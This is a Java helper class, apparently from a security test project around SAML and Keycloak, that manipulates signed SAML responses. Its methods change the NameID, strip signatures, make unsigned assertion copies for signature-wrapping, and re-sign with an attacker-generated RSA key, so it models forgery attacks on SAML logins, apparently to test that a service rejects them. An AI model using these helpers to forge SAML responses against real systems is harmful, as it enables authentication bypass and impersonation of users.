package com.jk.explore.security.samlkeycloak;

import java.io.StringWriter;
import java.nio.charset.StandardCharsets;
import java.security.GeneralSecurityException;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.util.Base64;
import java.util.List;
import javax.xml.XMLConstants;
import javax.xml.crypto.dsig.CanonicalizationMethod;
import javax.xml.crypto.dsig.DigestMethod;
import javax.xml.crypto.dsig.Reference;
import javax.xml.crypto.dsig.SignedInfo;
import javax.xml.crypto.dsig.Transform;
import javax.xml.crypto.dsig.XMLSignatureFactory;
import javax.xml.crypto.dsig.dom.DOMSignContext;
import javax.xml.crypto.dsig.keyinfo.KeyInfo;
import javax.xml.crypto.dsig.keyinfo.KeyInfoFactory;
import javax.xml.crypto.dsig.spec.C14NMethodParameterSpec;
import javax.xml.crypto.dsig.spec.TransformParameterSpec;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

/**
 * What an attacker does to a signed SAML response, with the JDK's own XML tools: read it, change a name, take signatures off, put a second assertion beside the signed one,
 * and sign with a key of the attacker's own. The parser used here refuses a DOCTYPE, like the shop's.
 */
final class SamlTools {

    static final String SAML = "urn:oasis:names:tc:SAML:2.0:assertion";
    static final String SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol";
    static final String DSIG = "http://www.w3.org/2000/09/xmldsig#";

    private SamlTools() {
    }

    static Document parse(String xml) {
        try {
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            factory.setNamespaceAware(true);
            factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
            factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            return factory.newDocumentBuilder().parse(new java.io.ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)));
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
    }

    static String decode(String samlResponse) {
        return new String(Base64.getMimeDecoder().decode(samlResponse), StandardCharsets.UTF_8);
    }

    static String encode(String xml) {
        return Base64.getEncoder().encodeToString(xml.getBytes(StandardCharsets.UTF_8));
    }

    static String serialize(Document doc) {
        try {
            Transformer transformer = TransformerFactory.newInstance().newTransformer();
            transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "yes");
            StringWriter out = new StringWriter();
            transformer.transform(new DOMSource(doc), new StreamResult(out));
            return out.toString();
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
    }

    static Element response(Document doc) {
        return doc.getDocumentElement();
    }

    static Element firstAssertion(Document doc) {
        return (Element) doc.getElementsByTagNameNS(SAML, "Assertion").item(0);
    }

    static void setNameId(Element assertion, String name) {
        assertion.getElementsByTagNameNS(SAML, "NameID").item(0).setTextContent(name);
    }

    static String nameId(Document doc) {
        return doc.getElementsByTagNameNS(SAML, "NameID").item(0).getTextContent();
    }

    /** Removes every signature element, from the response and from its assertions. */
    static void stripSignatures(Document doc) {
        NodeList signatures = doc.getElementsByTagNameNS(DSIG, "Signature");
        for (int i = signatures.getLength() - 1; i >= 0; i--) {
            Node signature = signatures.item(i);
            signature.getParentNode().removeChild(signature);
        }
    }

    /** Removes the signature that is a direct child of this element. */
    static void stripOwnSignature(Element element) {
        for (Node child = element.getFirstChild(); child != null; child = child.getNextSibling()) {
            if (child instanceof Element e && DSIG.equals(e.getNamespaceURI()) && "Signature".equals(e.getLocalName())) {
                element.removeChild(child);
                return;
            }
        }
    }

    static KeyPair attackerKey() {
        try {
            KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
            generator.initialize(2048);
            return generator.generateKeyPair();
        } catch (GeneralSecurityException e) {
            throw new IllegalStateException(e);
        }
    }

    /** Signs an element (enveloped, RSA with SHA-256, exclusive canonicalization), placing the signature right after its Issuer. */
    static void sign(Element element, KeyPair key) {
        try {
            element.setIdAttribute("ID", true);
            XMLSignatureFactory factory = XMLSignatureFactory.getInstance("DOM");
            Reference reference = factory.newReference("#" + element.getAttribute("ID"), factory.newDigestMethod(DigestMethod.SHA256, null),
                    List.of(factory.newTransform(Transform.ENVELOPED, (TransformParameterSpec) null), factory.newTransform(CanonicalizationMethod.EXCLUSIVE, (TransformParameterSpec) null)), null, null);
            SignedInfo signedInfo = factory.newSignedInfo(factory.newCanonicalizationMethod(CanonicalizationMethod.EXCLUSIVE, (C14NMethodParameterSpec) null),
                    factory.newSignatureMethod("http://www.w3.org/2001/04/xmldsig-more#rsa-sha256", null), List.of(reference));
            KeyInfoFactory keyInfoFactory = factory.getKeyInfoFactory();
            KeyInfo keyInfo = keyInfoFactory.newKeyInfo(List.of(keyInfoFactory.newKeyValue(key.getPublic())));
            Node afterIssuer = element.getElementsByTagNameNS(SAML, "Issuer").item(0).getNextSibling();
            DOMSignContext context = new DOMSignContext(key.getPrivate(), element, afterIssuer);
            factory.newXMLSignature(signedInfo, keyInfo).sign(context);
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
    }

    /** A copy of the first assertion without its signature, for the attacker to edit. */
    static Element unsignedCopyOfAssertion(Document doc) {
        Element copy = (Element) firstAssertion(doc).cloneNode(true);
        stripOwnSignature(copy);
        return copy;
    }

    static String describeSignatures(Document doc) {
        return doc.getElementsByTagNameNS(DSIG, "Signature").getLength() + " signatures";
    }
}
